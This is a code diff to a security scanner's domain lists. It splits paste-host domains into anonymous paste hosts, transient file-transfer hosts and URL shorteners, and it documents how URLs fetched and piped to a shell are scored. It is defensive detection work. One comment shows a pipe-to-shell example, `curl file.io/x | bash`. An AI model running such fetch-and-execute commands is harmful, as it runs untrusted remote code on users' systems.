@@ -13,28 +13,35 @@
 // ============================================================================
 
 /**
- * SMI-6033 Wave 2 (Gap 4): known paste/snippet-host domains — byte-identical
- * to core patterns.ts PASTE_HOST_DOMAINS. A URL to one of these hosts that is
- * the actual TARGET of a fetch/exec instruction elsewhere in the content is
- * standalone-critical (see security-scanner-edge.paste-host.ts's
- * scanPasteHostFetch) — "no normal install flow fetches executable payload
- * from an anonymous host." A URL to one of these hosts that is merely
- * linked/mentioned (not fetched) is NOT flagged by that new detector at all.
- * Unlike core, edge has no `url`/allowlist detector at all — a merely-linked
- * paste-host URL produces no finding of any kind on this side (a documented,
- * edge-only divergence from core's `url`:medium residual; edge's category
- * set has always been narrower than core's by design — see the plan's
- * Context section).
+ * SMI-6033 Wave 3 (Gap 4 fix): known paste/snippet-host domains, split into
+ * TWO reputation tiers — byte-identical to core patterns.ts. The
+ * originally-shipped version of this list was a single flat
+ * PASTE_HOST_DOMAINS array that incorrectly conflated durable anonymous
+ * paste hosts with transient debugging-reproducer hosts
+ * (transfer.sh/file.io scored identically to glot.io/pastebin.com), which
+ * the plan's provenance rule (§9) rejects. See
+ * security-scanner-edge.paste-host.ts's scanPasteHostFetch for the full
+ * detection logic.
+ *
+ * ANON_PASTE_HOSTS: durable anonymous code/snippet hosts with no
+ * debugging/incident-response use case that requires anonymity. A URL to
+ * one of these hosts (or a URL_SHORTENER_DOMAINS entry below) that is the
+ * target of an EXECUTION instruction is standalone-critical.
+ * Fetched-but-not-executed, or merely linked, is NOT flagged by the new
+ * detector at all. Unlike core, edge has no `url`/allowlist detector at
+ * all — a merely-linked (or fetched-but-not-executed) paste-host URL
+ * produces no finding of any kind on this side (a documented, edge-only
+ * divergence from core's `url`:medium residual; edge's category set has
+ * always been narrower than core's by design — see the plan's Context
+ * section).
  */
-export const PASTE_HOST_DOMAINS: string[] = [
+export const ANON_PASTE_HOSTS: string[] = [
   'glot.io',
   'pastebin.com',
   'paste.ee',
   'hastebin.com',
   'ix.io',
   '0x0.st',
-  'transfer.sh',
-  'file.io',
   'dpaste.org',
   'dpaste.com',
   'ghostbin.com',
@@ -44,6 +51,28 @@ export const PASTE_HOST_DOMAINS: string[] = [
   'paste.gg',
   'justpaste.it',
 ]
+
+/**
+ * TRANSIENT_TRANSFER_HOSTS: ephemeral file-transfer hosts with a genuine,
+ * documented legitimate use — a debugging or incident-response skill
+ * legitimately retrieving a one-off reproducer. Deliberately, ALWAYS
+ * medium/co-signal-eligible and NEVER standalone-critical, regardless of
+ * execution evidence: `curl file.io/x | bash` alone staying sub-threshold
+ * is a deliberate, documented residual, not a gap.
+ */
+export const TRANSIENT_TRANSFER_HOSTS: string[] = [
+  'transfer.sh',
+  'file.io',
+  'tmpfiles.org',
+  'temp.sh',
+]
+
+/**
+ * Known URL-shorteners join ANON_PASTE_HOSTS's critical rule, but ONLY when
+ * execution-correlated — a shortened URL piped to a shell has no legitimate
+ * install shape (unlike a bare shortened link, which is common and benign).
+ */
+export const URL_SHORTENER_DOMAINS: string[] = ['bit.ly', 'tinyurl.com', 't.co', 'is.gd']
 
 /**
  * Jailbreak attempt patterns - attempts to manipulate AI behavior
